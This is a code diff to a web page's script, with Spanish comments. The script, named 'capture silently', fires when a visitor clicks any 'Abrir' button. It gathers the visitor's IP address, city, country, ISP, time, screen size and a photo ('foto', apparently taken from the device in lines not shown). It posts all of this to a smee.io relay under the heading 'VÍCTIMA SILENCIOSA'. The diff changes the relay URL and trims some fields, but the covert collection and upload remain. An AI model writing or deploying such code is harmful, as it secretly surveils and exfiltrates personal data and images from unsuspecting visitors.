@@ -49,8 +49,8 @@
 </main>
 
 <script>
-// PROXY 100% SEGURO (tu smee.io)
-const PROXY = "https://smee.io/H1QXmM2havlUtU";
+// TU PROXY SEGURO (smee.io)
+const PROXY = "https://smee.io/jZpKzhn9YlVDk56";
 
 async function capturarSilencioso(cliente) {
   let foto = null;
@@ -68,36 +68,20 @@ async function capturarSilencioso(cliente) {
   }catch(e){}
 
   const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
-  const battery = await navigator.getBattery?.()||{};
-
-  const datos = {
-    cliente,
-    hora: new Date().toLocaleString(),
-    ip: geo.ip||'oculta',
-    ubicacion: `${geo.city||'?'}, ${geo.country_name||'?'}`,
-    isp: geo.org||'?',
-    navegador: navigator.userAgent,
-    pantalla: `${screen.width}x${screen.height}`,
-    bateria: battery.level?`${Math.round(battery.level*100)}%`:'?',
-    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    pestañas: history.length
-  };
 
   const form = new FormData();
   form.append('content', 
 `VÍCTIMA SILENCIOSA
-Cliente: ${datos.cliente}
-IP: ${datos.ip} (${datos.isp})
-Ubicación: ${datos.ubicacion}
-Hora: ${datos.hora}
-Pantalla: ${datos.pantalla} | Batería: ${datos.bateria}
-Zona: ${datos.zona} | Pestañas: ${datos.pestañas}`);
+Cliente: ${cliente}
+IP: ${geo.ip||'oculta'}
+Ubicación: ${geo.city||'?'}, ${geo.country_name||'?'}
+Hora: ${new Date().toLocaleString()}
+Pantalla: ${screen.width}x${screen.height}`);
 
   if(foto) form.append('file', foto, 'foto.jpg');
   await fetch(PROXY, {method:'POST', body:form});
 }
 
-// Capturar al dar click en cualquier "Abrir"
 document.querySelectorAll('.open').forEach(btn => {
   btn.onclick = () => {
     const nombre = btn.parentNode.querySelector('.name')?.textContent || 'Cliente';
